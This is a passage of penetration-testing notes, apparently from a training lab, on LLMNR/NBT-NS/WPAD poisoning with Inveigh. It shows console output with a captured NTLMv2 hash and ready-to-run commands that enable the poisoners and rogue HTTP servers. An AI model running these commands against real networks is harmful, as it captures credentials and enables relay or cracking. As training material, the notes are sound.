> [+] WPAD NTLM Authentication Ignore List = Firefox
> [+] WPAD Response = Enabled
> [+] Kerberos TGT Capture = Disabled
> [+] Machine Account Capture = Disabled
> [+] Console Output = Full
> [+] File Output = Disabled
> WARNING: [!] Run Stop-Inveigh to stop
> [*] Press any key to stop console output
> WARNING: [-] [2026-07-31T02:56:57] Error starting HTTP listener
> WARNING: [!] [2026-07-31T02:56:57] Exception calling "Start" with "0" argument(s): "An attempt was made to access a socket in a way forbidden by its access permissions"
> $HTTP_listener.Start()
> [+] [2026-07-31T02:56:57] TCP(1433) SYN packet detected from 172.16.5.130:50179
> [+] [2026-07-31T02:56:57] TCP(1433) SYN packet detected from 172.16.5.130:50180
> [+] [2026-07-31T02:56:57] mDNS(QM) request academy-ea-web0.local received from 172.16.5.130 [spoofer disabled]
> [+] [2026-07-31T02:56:57] mDNS(QM) request academy-ea-web0.local received from 172.16.5.130 [spoofer disabled]
> # ... 
> [+] [2026-07-31T02:57:04] TCP(445) SYN packet detected from 172.16.5.130:50204
> [+] [2026-07-31T02:57:04] SMB(445) negotiation request detected from 172.16.5.130:50204
> [+] [2026-07-31T02:57:04] SMB(445) NTLM challenge 6B5A09C6E9AAAFBB sent to 172.16.5.130:50204
> [+] [2026-07-31T02:57:04] SMB(445) NTLMv2 captured for INLANEFREIGHT\backupagent from 172.16.5.130(ACADEMY-EA-FILE):50204:
> backupagent::INLANEFREIGHT:6B5A09C6E9AAAFBB:C4A783C2923F1557BCD187E4599F972F:010100000000000047F39FF0D220DD014EE29DBA8BBDF3290000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080047F39FF0D220DD0106000400020000000800300030000000000000000000000000300000AE9603D39AB42CE1AD35946819CBE8F3CC42DF6038E292A1A8EE8FEB8DB9982B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
> [+] [2026-07-31T02:57:04] TCP(445) SYN packet detected from 172.16.5.130:50205
> [+] [2026-07-31T02:57:04] TCP(445) SYN packet detected from 172.16.5.130:50206
> # ...
> ```

- Start with WPAD and HTTP/HTTPS rogue servers:

```powershell
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -HTTP Y -HTTPS Y -WPAD Y
```

| Option                             | Description                                           |
| ---------------------------------- | ----------------------------------------------------- |
| `-ConsoleOutput Y`                 | Print live events to the console.                     |
| `-LLMNR Y` / `-NBNS Y` / `-mDNS Y` | Enable the respective poisoners.                      |
| `-HTTP Y` / `-HTTPS Y`             | Enable rogue HTTP/HTTPS capture servers.              |
| `-WPAD Y`                          | Enable WPAD spoofing.                                 |
| `-Inspect`                         | Listen-only mode (observe traffic without poisoning). |
| `-RunTime`                         | Automatically stop after a given runtime.             |

### C# `Inveigh` (`InveighZero`)

- Run with default spoofing:

```powershell
Inveigh.exe
```

- Run with specific options:

```powershell
Inveigh.exe -LLMNR Y -NBNS Y -mDNS Y -HTTP Y -HTTPS Y -WPAD Y
```

- Captured hashes are displayed in the console and logged to a file.
- `Inveigh` supports real-time hash filtering, replay, and relay options.
## References

- [`LLMNR — RFC 4795`](https://datatracker.ietf.org/doc/html/rfc4795)
- [`NBT-NS — RFC 1001`](https://datatracker.ietf.org/doc/html/rfc1001), [`RFC 1002`](https://datatracker.ietf.org/doc/html/rfc1002)
- [`Responder — GitHub`](https://github.com/lgandx/Responder)
- [`Inveigh — GitHub`](https://github.com/Kevin-Robertson/Inveigh)
- [`Hashcat example hashes`](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [`LLMNR/NBT-NS Poisoning — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/mitm-and-coercions/llmnr-nbtns-mdns)
- [`SMB Relay Attacks — Impacket`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)
- [`MITRE ATT&CK T1557.001`](https://attack.mitre.org/techniques/T1557/001/)
